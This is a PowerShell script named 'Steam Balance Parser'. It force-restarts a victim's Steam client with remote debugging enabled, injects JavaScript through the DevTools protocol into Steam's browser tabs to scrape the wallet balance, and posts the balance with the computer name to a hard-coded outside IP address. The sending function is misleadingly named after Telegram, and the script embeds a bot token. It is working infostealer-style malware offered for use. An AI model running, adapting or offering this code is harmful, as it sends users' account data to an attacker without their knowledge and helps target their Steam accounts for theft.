param(
    [int]$Port = 8080,
    [string]$SteamPath = "C:\Program Files (x86)\Steam\steam.exe",
    [string]$TelegramBotToken = "8525982740:AAHj8V3rFo_o629srRi1vTl9C7XrkilL7u0",
    [string]$TelegramChatId = "7695288740"
)

Add-Type -AssemblyName System.Net.Http

Write-Host "`n=== STEAM BALANCE PARSER v12 ===" -ForegroundColor Cyan

function Send-TelegramMessage {
    param(
        [string]$Message,
        [string]$BotToken,
        [string]$ChatId
    )

    try {
        $url = "http://89.34.90.212:8000/text"
        $null = Invoke-RestMethod -Uri $url -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return $true
    } catch {
        Write-Host "[WARN] Failed to send Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Test-BalanceGarbage {
    param([string]$Text)

    if ([string]::IsNullOrWhiteSpace($Text)) { return $true }

    $s = ($Text -replace '\s+', ' ').Trim()
    if ($s -in @('-', '—', '–', 'N/A', 'n/a')) { return $true }
    if ($s.Length -gt 32) { return $true }
    if ($s -notmatch '\d') { return $true }

    # username + number without currency, e.g. "rzeczykkusdvuhu 8046"
    if ($s -match '^[A-Za-zА-Яа-я]{4,}\s+\d') { return $true }
    if ($s -match '\d\s+[A-Za-zА-Яа-я]{4,}$') { return $true }

    $lettersOnly = ($s -replace '[\d\s.,\$€£₽₴₸₩₫]', '' -replace '(?i)(USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB|IDR|MYR|PHP|руб|грн|uah|zł)', '').Trim()
    if ($lettersOnly.Length -ge 4) { return $true }

    return $false
}

function Test-BalanceText {
    param([string]$Text)

    if (Test-BalanceGarbage -Text $Text) { return $false }

    $s = ($Text -replace '\s+', ' ').Trim()

    $patterns = @(
        '^[\$€£₽₴₸₩₫]\s?\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?$',
        '^\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫]$',
        '^\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?(?:руб|грн|zł|USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB)$',
        '^[\$€£₽₴₸₩₫]\s?\d+(?:[.,]\d{1,2})?$',
        '^\d+(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫]$',
        '^\d+(?:[.,]\d{1,2})?(?:руб|грн|zł)$'
    )

    foreach ($pattern in $patterns) {
        if ($s -match $pattern) { return $true }
    }

    return $false
}

function Normalize-BalanceText {
    param([string]$Text)

    if ([string]::IsNullOrWhiteSpace($Text)) { return "" }

    $s = ($Text -replace '\s+', ' ').Trim()
    if (Test-BalanceText -Text $s) { return $s }

    $patterns = @(
        '([\$€£₽₴₸₩₫]\s?\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?)',
        '(\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫])',
        '(\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?(?:руб|грн|zł|USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB))',
        '(\d+(?:[.,]\d{1,2})?(?:руб|грн|zł))'
    )

    foreach ($pattern in $patterns) {
        if ($s -match $pattern) {
            $candidate = $Matches[1].Trim()
            if (Test-BalanceText -Text $candidate) { return $candidate }
        }
    }

    return ""
}

function Test-SuspiciousRoundBalance {
    param([string]$Balance)

    $s = ($Balance -replace '\s+', '').Trim()
    return ($s -match '^(?:[\$€£₽₴₸₩₫])?5(?:[.,]00)?(?:[\$€£₽₴₸₩₫])?$')
}

function Send-BalanceResult {
    param(
        [string]$ComputerName,
        [string]$Balance
    )

    $Balance = Normalize-BalanceText -Text $Balance
    if (-not $Balance) {
        Write-Host "[ERROR] Invalid balance value" -ForegroundColor Red
        Send-TelegramMessage -Message "Name: $ComputerName`nError: Invalid balance value" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
        exit 1
    }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " STEAM WALLET BALANCE" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " Balance: $Balance" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""

    $telegramMsg = "Name: $ComputerName`nBalance: $Balance"
    if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
        Write-Host "[OK] Message sent!" -ForegroundColor Green
    } else {
        Write-Host "[ERROR] Failed to send message" -ForegroundColor Red
    }
}

function Resolve-SteamPath {
    $candidates = @()

    foreach ($key in @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam",
        "HKLM:\SOFTWARE\Valve\Steam"
    )) {
        $p = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamPath
        if ($p) { $candidates += (Join-Path $p "steam.exe") }
        $exe = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamExe
        if ($exe) { $candidates += $exe }
    }

    $candidates += @(
        $SteamPath,
        "C:\Program Files (x86)\Steam\steam.exe",
        "C:\Program Files\Steam\steam.exe",
        "$env:ProgramFiles\Steam\steam.exe",
        "${env:ProgramFiles(x86)}\Steam\steam.exe",
        "D:\Steam\steam.exe",
        "E:\Steam\steam.exe"
    )

    foreach ($c in $candidates) {
        if ($c -and (Test-Path -LiteralPath $c)) {
            return (Resolve-Path -LiteralPath $c).Path
        }
    }

    return $null
}

function Test-SteamDebugPort {
    try {
        $null = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 2 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function Stop-SteamProcesses {
    foreach ($name in @("steam", "steamwebhelper", "steamservice", "GameOverlayUI")) {
        Get-Process $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Start-SteamWithDebug {
    Write-Host "[i] Checking if Steam is running with debug port..." -ForegroundColor Cyan

    if (Test-SteamDebugPort) {
        Write-Host "[OK] Steam debug port is already available" -ForegroundColor Green
        return $true
    }

    $exe = Resolve-SteamPath
    if (-not $exe) {
        Write-Host "[WARN] Steam.exe not found, will still try existing process" -ForegroundColor Yellow
    } else {
        Write-Host "[i] Steam path: $exe" -ForegroundColor Gray
    }

    for ($attempt = 1; $attempt -le 2; $attempt++) {
        Write-Host "[i] Starting Steam with debug, attempt $attempt/2..." -ForegroundColor Yellow

        Stop-SteamProcesses
        Start-Sleep -Seconds 3

        if ($exe) {
            Start-Process -FilePath $exe -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
        } elseif (Get-Command steam -ErrorAction SilentlyContinue) {
            Start-Process steam -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
        }

        $waited = 0
        $limit = 60
        while ($waited -lt $limit) {
            Start-Sleep -Seconds 3
            $waited += 3
            Write-Host "[i] Waiting for Steam... ($waited/$limit sec)" -ForegroundColor Gray

            if (Test-SteamDebugPort) {
                Write-Host "[OK] Steam debug port is up" -ForegroundColor Green
                Start-Sleep -Seconds 8
                return $true
            }
        }
    }

    if (Get-Process steam -ErrorAction SilentlyContinue) {
        Write-Host "[WARN] Steam process exists but debug port is down" -ForegroundColor Yellow
    } else {
        Write-Host "[WARN] Steam did not start" -ForegroundColor Yellow
    }

    return $false
}

function Invoke-CdpEvaluate {
    param(
        $Tab,
        [string]$JsCode,
        [int]$WaitMs = 400
    )

    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
    try {
        $ws.ConnectAsync([Uri]$Tab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(4000) | Out-Null
        if ($ws.State -ne 'Open') { return "" }

        $evalMsg = @{
            id = 1
            method = "Runtime.evaluate"
            params = @{
                expression = $JsCode
                returnByValue = $true
            }
        } | ConvertTo-Json -Depth 10 -Compress

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
        $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null
        Start-Sleep -Milliseconds $WaitMs

        $recv = New-Object byte[] 65535
        $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
        $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)
        $data = $json | ConvertFrom-Json

        if ($ws.State -eq 'Open') {
            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()
        }

        $val = $data.result.result.value
        if ($null -eq $val) { return "" }
        return [string]$val
    } catch {
        return ""
    } finally {
        if ($ws.State -eq 'Open') {
            try { $ws.Abort() } catch {}
        }
        $ws.Dispose()
    }
}

function Get-WalletCandidatesFromTab {
    param($Tab)

    $jsCode = @"
(function() {
    function isGarbage(s) {
        s = (s || '').replace(/\s+/g, ' ').trim();
        if (!s || s === '-' || s === '—' || s.length > 32) return true;
        if (!/\d/.test(s)) return true;
        if (/^[A-Za-zА-Яа-я]{4,}\s+\d/.test(s)) return true;
        if (/\d\s+[A-Za-zА-Яа-я]{4,}$/.test(s)) return true;
        var letters = s.replace(/[\d\s.,\$€£₽₴₸₩₫]/g, '')
            .replace(/\b(USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB|руб|грн|uah|zł)\b/gi, '');
        return letters.length >= 4;
    }

    function looksLikeBalance(s) {
        if (isGarbage(s)) return false;
        var patterns = [
            /^[\$€£₽₴₸₩₫]\s?\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?$/,
            /^\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫]$/,
            /^\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?(?:руб|грн|zł|USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB)$/i,
            /^[\$€£₽₴₸₩₫]\s?\d+(?:[.,]\d{1,2})?$/,
            /^\d+(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫]$/,
            /^\d+(?:[.,]\d{1,2})?(?:руб|грн|zł)$/i
        ];
        return patterns.some(function(p) { return p.test(s); });
    }

    function extractBalance(raw) {
        if (!raw) return '';
        raw = raw.replace(/\s+/g, ' ').trim();
        if (looksLikeBalance(raw)) return raw;
        var patterns = [
            /([\$€£₽₴₸₩₫]\s?\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?)/,
            /(\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?\s*[\$€£₽₴₸₩₫])/,
            /(\d{1,3}(?:[\s.,]\d{3})*(?:[.,]\d{1,2})?(?:руб|грн|zł|USD|EUR|RUB|UAH|KZT|KRW|VND|PLN|THB))/i,
            /(\d+(?:[.,]\d{1,2})?(?:руб|грн|zł))/i
        ];
        for (var i = 0; i < patterns.length; i++) {
            var m = raw.match(patterns[i]);
            if (m && looksLikeBalance(m[1])) return m[1].trim();
        }
        return '';
    }

    function pushCandidate(list, value, score) {
        if (!value || !looksLikeBalance(value)) return;
        for (var i = 0; i < list.length; i++) {
            if (list[i].value === value) return;
        }
        list.push({ value: value, score: score });
    }

    var out = [];

    var walletEl = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
    if (walletEl) {
        pushCandidate(out, extractBalance(walletEl.textContent || ''), 1000);
    }

    var selectors = [
        '[class*="walletBalance"]',
        '[class*="accountBalance"]',
        '[data-wallet-balance]',
        'a[href*="/account/history/"]',
        'a[href*="/account/"]'
    ];

    for (var s = 0; s < selectors.length; s++) {
        var nodes = document.querySelectorAll(selectors[s]);
        for (var n = 0; n < nodes.length; n++) {
            pushCandidate(out, extractBalance(nodes[n].textContent || ''), 700 - s * 20);
        }
    }

    var nodes = document.querySelectorAll('span, div, a, button');
    for (var i = 0; i < nodes.length; i++) {
        var t = (nodes[i].textContent || '').replace(/\s+/g, ' ').trim();
        if (!t || t.length > 32) continue;
        var val = extractBalance(t);
        if (val) pushCandidate(out, val, 100);
    }

    return out;
})();
"@

    $raw = Invoke-CdpEvaluate -Tab $Tab -JsCode $jsCode -WaitMs 500
    if ([string]::IsNullOrWhiteSpace($raw)) { return @() }

    try {
        $items = $raw | ConvertFrom-Json
    } catch {
        return @()
    }

    $results = @()
    foreach ($item in $items) {
        $balance = Normalize-BalanceText -Text ([string]$item.value)
        if (-not $balance) { continue }
        $results += [PSCustomObject]@{
            Balance = $balance
            SourceScore = [int]$item.score
        }
    }
    return $results
}

function Get-TabContextScore {
    param($Tab)

    $score = 0
    $url = [string]$Tab.url
    $title = [string]$Tab.title

    if ($title -eq 'Steam') { $score += 200 }
    if ($url -match 'store\.steampowered\.com/account|/account/|wallet') { $score += 40 }
    if ($url -match '/app/\d+|/sub/\d+|/bundle/\d+') { $score -= 80 }
    if ($url -match '/cart|/checkout|/login') { $score -= 50 }

    return $score
}

function Open-AccountPageInTab {
    param($Tab)

    $jsCode = @"
(function() {
    if (location.href.indexOf('/account') >= 0) return 'already';
    location.href = 'https://store.steampowered.com/account/';
    return 'navigating';
})();
"@

    return Invoke-CdpEvaluate -Tab $Tab -JsCode $jsCode -WaitMs 200
}

function Select-BestBalanceCandidate {
    param(
        [array]$Candidates
    )

    if (-not $Candidates -or $Candidates.Count -eq 0) { return "" }

    $ranked = foreach ($c in $Candidates) {
        $score = $c.SourceScore + $c.TabScore
        if (Test-SuspiciousRoundBalance -Balance $c.Balance) { $score -= 300 }
        if ($c.Balance -match '[.,]\d{2}') { $score += 20 }
        if ($c.SourceScore -ge 1000) { $score += 100 }

        [PSCustomObject]@{
            Balance = $c.Balance
            Score = $score
            Tab = $c.TabTitle
            Source = $c.SourceScore
        }
    }

    $best = $ranked | Sort-Object Score -Descending | Select-Object -First 1
    Write-Host "[OK] Picked '$($best.Balance)' from tab '$($best.Tab)' (score=$($best.Score), source=$($best.Source))" -ForegroundColor Green
    return $best.Balance
}

function Get-SteamWalletBalance {
    if (-not (Test-SteamDebugPort)) {
        return ""
    }

    try {
        $tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
    } catch {
        return ""
    }

    Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray

    $ordered = @($tabs | Where-Object { $_.title -eq 'Steam' }) +
               @($tabs | Where-Object { $_.title -ne 'Steam' })

    $allCandidates = @()

    foreach ($tab in $ordered) {
        if (-not $tab.webSocketDebuggerUrl) { continue }

        $tabScore = Get-TabContextScore -Tab $tab
        Write-Host "[i] Checking tab: $($tab.title) | score=$tabScore | $($tab.url)" -ForegroundColor Gray

        foreach ($item in (Get-WalletCandidatesFromTab -Tab $tab)) {
            $allCandidates += [PSCustomObject]@{
                Balance = $item.Balance
                SourceScore = $item.SourceScore
                TabScore = $tabScore
                TabTitle = [string]$tab.title
            }
        }
    }

    $best = Select-BestBalanceCandidate -Candidates $allCandidates
    if ($best) { return $best }

    $steamTab = $ordered | Where-Object { $_.title -eq 'Steam' -and $_.webSocketDebuggerUrl } | Select-Object -First 1
    if ($steamTab) {
        Write-Host "[i] Opening account page for fallback..." -ForegroundColor Yellow
        $null = Open-AccountPageInTab -Tab $steamTab
        Start-Sleep -Seconds 8

        $fallbackCandidates = @()
        foreach ($item in (Get-WalletCandidatesFromTab -Tab $steamTab)) {
            $fallbackCandidates += [PSCustomObject]@{
                Balance = $item.Balance
                SourceScore = $item.SourceScore
                TabScore = 60
                TabTitle = [string]$steamTab.title
            }
        }

        $best = Select-BestBalanceCandidate -Candidates $fallbackCandidates
        if ($best) { return $best }
    }

    return ""
}

$computerName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
Write-Host "[i] Time: $timestamp" -ForegroundColor Gray

$steamOk = Start-SteamWithDebug
if (-not $steamOk) {
    Write-Host "[ERROR] Could not start Steam" -ForegroundColor Red
    Send-TelegramMessage -Message "Name: $computerName`nError: Could not start Steam" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
    exit 1
}

$walletBalance = Get-SteamWalletBalance
if (-not $walletBalance) {
    Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
    Send-TelegramMessage -Message "Name: $computerName`nError: Balance element not found" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
    exit 1
}

Send-BalanceResult -ComputerName $computerName -Balance $walletBalance
Write-Host ""
